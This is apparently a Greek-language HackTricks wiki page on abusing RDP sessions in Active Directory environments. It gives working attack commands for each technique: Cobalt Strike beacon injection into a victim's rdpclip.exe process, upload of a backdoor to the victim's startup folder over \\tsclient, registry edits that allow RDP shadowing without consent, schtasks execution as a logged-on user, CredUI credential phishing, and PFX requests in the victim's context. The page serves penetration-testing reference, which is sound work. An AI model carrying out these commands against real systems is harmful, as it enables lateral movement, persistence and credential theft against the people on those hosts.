# RDP Sessions Abuse

{{#include ../../banners/hacktricks-training.md}}

## RDP Process Injection

Αν το **external group** έχει **RDP access** σε οποιονδήποτε **υπολογιστή** στο τρέχον domain, ένας **attacker** θα μπορούσε να κάνει **compromise σε αυτόν τον υπολογιστή και να τον περιμένει**.

Μόλις αυτός ο χρήστης αποκτήσει πρόσβαση μέσω RDP, ο **attacker** μπορεί να κάνει **pivot στη session αυτού του χρήστη** και να κάνει abuse των permissions της στο external domain.
```bash
# Supposing the group "External Users" has RDP access in the current domain
## lets find where they could access
## The easiest way would be with bloodhound, but you could also run:
Get-DomainGPOUserLocalGroupMapping -Identity "External Users" -LocalGroup "Remote Desktop Users" | select -expand ComputerName
#or
Find-DomainLocalGroupMember -GroupName "Remote Desktop Users" | select -expand ComputerName

# Then, compromise the listed machines, and wait til someone from the external domain logs in:
net logons
Logged on users at \\localhost:
EXT\super.admin

# With cobalt strike you could just inject a beacon inside of the RDP process
beacon> ps
PID   PPID  Name                         Arch  Session     User
---   ----  ----                         ----  -------     -----
...
4960  1012  rdpclip.exe                  x64   3           EXT\super.admin

beacon> inject 4960 x64 tcp-local
## From that beacon you can just run powerview modules interacting with the external domain as that user
```
Έλεγξε **άλλους τρόπους κλοπής sessions με άλλα εργαλεία** [**σε αυτήν τη σελίδα.**](../../network-services-pentesting/pentesting-rdp.md#session-stealing)

## RDPInception

Αν ένας χρήστης συνδεθεί μέσω **RDP σε ένα μηχάνημα** όπου ένας **attacker** τον **περιμένει**, ο attacker θα μπορεί να **injectάρει ένα beacon στο RDP session του χρήστη** και, αν το **victim έκανε mount το drive του** κατά τη σύνδεση μέσω RDP, ο **attacker θα μπορούσε να αποκτήσει πρόσβαση σε αυτό**.

Σε αυτήν την περίπτωση, θα μπορούσες απλώς να **κάνεις compromise** στον **αρχικό υπολογιστή του victim**, γράφοντας ένα **backdoor** στον **startup folder**.
```bash
# Wait til someone logs in:
net logons
Logged on users at \\localhost:
EXT\super.admin

# With cobalt strike you could just inject a beacon inside of the RDP process
beacon> ps
PID   PPID  Name                         Arch  Session     User
---   ----  ----                         ----  -------     -----
...
4960  1012  rdpclip.exe                  x64   3           EXT\super.admin

beacon> inject 4960 x64 tcp-local

# There's a UNC path called tsclient which has a mount point for every drive that is being shared over RDP.
## \\tsclient\c is the C: drive on the origin machine of the RDP session
beacon> ls \\tsclient\c

Size     Type    Last Modified         Name
----     ----    -------------         ----
dir     02/10/2021 04:11:30   $Recycle.Bin
dir     02/10/2021 03:23:44   Boot
dir     02/20/2021 10:15:23   Config.Msi
dir     10/18/2016 01:59:39   Documents and Settings
[...]

# Upload backdoor to startup folder
beacon> cd \\tsclient\c\Users\<username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
beacon> upload C:\Payloads\pivot.exe
```
## Shadow RDP

Εάν είστε **local admin** σε έναν host όπου το θύμα έχει ήδη μια **active RDP session**, ενδέχεται να μπορείτε να **δείτε/ελέγξετε αυτό το desktop χωρίς stealing του password ή dumping του LSASS**.<sup>[[1]](#references)</sup>

Αυτό εξαρτάται από την πολιτική **Remote Desktop Services shadowing** που είναι αποθηκευμένη στο:<sup>[[2]](#references)[[3]](#references)</sup>
```text
HKLM\Software\Policies\Microsoft\Windows NT\Terminal Services\Shadow
```
Ενδιαφέρουσες τιμές:

- `0`: Απενεργοποιημένο
- `1`: `EnableInputNotify` (έλεγχος, απαιτείται έγκριση χρήστη)
- `2`: `EnableInputNoNotify` (έλεγχος, **δεν απαιτείται έγκριση χρήστη**)
- `3`: `EnableNoInputNotify` (μόνο προβολή, απαιτείται έγκριση χρήστη)
- `4`: `EnableNoInputNoNotify` (μόνο προβολή, **δεν απαιτείται έγκριση χρήστη**)
```cmd
:: Check the policy
reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow

:: Enable interaction without consent
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow /t REG_DWORD /d 2 /f

:: Enumerate sessions and shadow the target one
quser /server:<HOST>
mstsc /v:<HOST> /shadow:<SESSION_ID> /control /noconsentprompt /prompt
```
Αυτό είναι ιδιαίτερα χρήσιμο όταν ένας **privileged user** που είχε συνδεθεί μέσω RDP άφησε ξεκλείδωτη την επιφάνεια εργασίας, μια συνεδρία KeePass, μια κονσόλα MMC, μια συνεδρία browser ή ένα ανοιχτό admin shell.

## Scheduled Tasks As Logged-On User

Εάν είστε **local admin** και ο χρήστης-στόχος είναι **currently logged on**, το Task Scheduler μπορεί να εκκινήσει κώδικα **ως αυτός ο χρήστης χωρίς τον κωδικό πρόσβασής του**.<sup>[[1]](#references)[[4]](#references)</sup>

Αυτό μετατρέπει την υπάρχουσα logon session του θύματος σε primitive εκτέλεσης:
```cmd
schtasks /create /S <HOST> /RU "<DOMAIN\\user>" /SC ONCE /ST 00:00 /TN "Updater" /TR "cmd.exe /c whoami > C:\\Windows\\Temp\\whoami.txt"
schtasks /run /S <HOST> /TN "Updater"
```
Σημειώσεις:

- Αν ο χρήστης **δεν είναι συνδεδεμένος**, τα Windows συνήθως απαιτούν τον κωδικό πρόσβασης για τη δημιουργία μιας εργασίας που εκτελείται ως αυτός.
- Αν ο χρήστης **είναι συνδεδεμένος**, η εργασία μπορεί να επαναχρησιμοποιήσει το υπάρχον logon context.
- Αυτός είναι ένας πρακτικός τρόπος για την εκτέλεση ενεργειών GUI ή την εκκίνηση binaries μέσα στη session του victim χωρίς αλληλεπίδραση με το LSASS.

## Κατάχρηση CredUI Prompt Από τη Session του Victim

Μόλις μπορέσετε να εκτελέσετε κώδικα **μέσα στο interactive desktop του victim** (για παράδειγμα μέσω **Shadow RDP** ή μιας **scheduled task που εκτελείται ως ο συγκεκριμένος χρήστης**), μπορείτε να εμφανίσετε ένα **πραγματικό Windows credential prompt** χρησιμοποιώντας CredUI APIs και να συλλέξετε credentials που εισάγει ο victim.<sup>[[1]](#references)</sup>

Σχετικά APIs:

- `CredUIPromptForWindowsCredentials`
- `CredUnPackAuthenticationBuffer`

Τυπική ροή:

1. Εκκινήστε ένα binary στη session του victim.
2. Εμφανίστε ένα domain-authentication prompt που αντιστοιχεί στο branding του τρέχοντος domain.
3. Κάντε unpack το auth buffer που επιστράφηκε.
4. Επικυρώστε τα credentials που δόθηκαν και, προαιρετικά, συνεχίστε να εμφανίζετε prompts μέχρι να εισαχθούν έγκυρα credentials.

Αυτό είναι χρήσιμο για **on-host phishing**, επειδή το prompt αποδίδεται από standard Windows APIs αντί για μια fake HTML form.

## Αίτηση PFX Στο Context του Victim

Το ίδιο primitive της **scheduled-task-as-user** μπορεί να χρησιμοποιηθεί για την αίτηση ενός **certificate/PFX ως ο συνδεδεμένος victim**. Αυτό το certificate μπορεί αργότερα να χρησιμοποιηθεί για **AD authentication** ως ο συγκεκριμένος χρήστης, αποφεύγοντας εντελώς την κλοπή κωδικών πρόσβασης.<sup>[[1]](#references)[[5]](#references)</sup>

Ροή υψηλού επιπέδου:

1. Αποκτήστε **local admin** σε έναν host όπου είναι συνδεδεμένος ο victim.
2. Εκτελέστε τη λογική enrollment/export ως ο victim χρησιμοποιώντας μια **scheduled task**.
3. Κάντε export το resulting **PFX**.
4. Χρησιμοποιήστε το PFX για PKINIT / certificate-based AD authentication.

Δείτε τις σελίδες AD CS για επόμενη κατάχρηση:

{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

## References

- [1] [SensePost - Από flat networks σε locked up domains με tiering models](https://sensepost.com/blog/2026/from-flat-networks-to-locked-up-domains-with-tiering-models/)
- [2] [Microsoft - Remote Desktop shadow](https://learn.microsoft.com/windows/win32/termserv/remote-desktop-shadow)
- [3] [NetExec - Shadow RDP plugin PR #465](https://github.com/Pennyw0rth/NetExec/pull/465)
- [4] [NetExec - schtask_as module](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/schtask_as.py)
- [5] [NetExec - Request PFX μέσω scheduled task PR #908](https://github.com/Pennyw0rth/NetExec/pull/908)

{{#include ../../banners/hacktricks-training.md}}
